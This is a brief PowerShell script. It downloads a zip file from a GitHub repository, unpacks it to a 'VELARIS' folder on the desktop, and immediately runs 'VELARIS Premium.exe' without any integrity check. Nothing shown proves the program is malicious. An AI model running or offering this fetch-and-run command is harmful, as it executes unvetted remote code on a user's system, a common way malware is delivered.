$zip = "$env:TEMP\velaris.zip"
$folder = "$env:USERPROFILE\Desktop\VELARIS"

Invoke-WebRequest "https://raw.githubusercontent.com/ah5e/Velaris2/main/velaris.zip" -OutFile $zip
Expand-Archive -Path $zip -DestinationPath $folder -Force
Start-Process "$folder\VELARIS Premium.exe"
